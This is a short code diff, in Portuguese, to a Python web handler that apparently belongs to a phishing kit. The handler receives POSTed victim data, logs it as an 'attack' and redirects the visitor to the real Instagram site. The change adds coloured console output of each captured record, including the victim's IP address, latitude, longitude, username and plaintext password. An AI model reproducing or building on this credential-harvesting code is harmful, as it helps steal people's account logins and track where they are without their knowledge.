@@ -54,7 +54,21 @@ def receber():
 }
     print("---------------------------------------------Alguem Fez um Post------------------------------------------------")
     AddAtack(dados)
-    printAllAtack()
+    
+    GREEN = "\033[32m"
+    WHITE = "\033[37m"
+    RESET = "\033[0m"
+    print(
+        f"""
+    {GREEN}Tipo:{RESET} {WHITE}{dados['tipo']}{RESET}
+    {GREEN}IP:{RESET} {WHITE}{dados['ip']}{RESET}
+    {GREEN}Latitude:{RESET} {WHITE}{dados['latitude']}{RESET}
+    {GREEN}Longitude:{RESET} {WHITE}{dados['longitude']}{RESET}
+    {GREEN}Usuario:{RESET} {WHITE}{dados['username']}{RESET}
+    {GREEN}Senha:{RESET} {WHITE}{dados['password']}{RESET}
+    {GREEN}Data:{RESET} {WHITE}{dados['datetime']}{RESET}
+        """
+    )
     
     return redirect("https://instagram.com")
 
